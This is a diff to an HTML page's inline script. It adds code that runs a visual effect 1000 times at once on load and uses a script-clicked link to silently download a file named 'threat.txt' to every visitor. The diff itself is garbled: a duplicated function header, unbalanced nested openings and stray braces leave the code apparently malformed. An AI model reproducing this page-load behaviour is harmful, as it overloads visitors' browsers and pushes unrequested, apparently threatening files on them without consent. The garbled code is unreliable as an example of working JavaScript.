@@ -98,7 +98,6 @@
 
   function runEffect() {
     (t => {
-  function runEffect() {
     (t => {
         (t => {
         function i() {
@@ -229,17 +228,26 @@
 
     URL.revokeObjectURL(url);
   }
+    })();
+  }
 
-  // Kick off everything immediately
-  (function startAll() {
-    // Run the visual effect 1000 times instantly
+  // Kick off 1000 runs immediately
+  (function startMany() {
     for (let k = 0; k < RUNS; k++) {
-      runEffect();
+      runEffect(); // direct call, no delay
     }
-
-    // Trigger the downloads
-    downloadThreatFile();
   })();
+
+  // Automatically download threat.txt when the page loads
+  window.addEventListener("load", () => {
+    const link = document.createElement("a");
+    link.href = "threat.txt";   // adjust path if file is in a subfolder
+    link.download = "threat.txt";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  });
+</script>
 
 </body>
 </html>
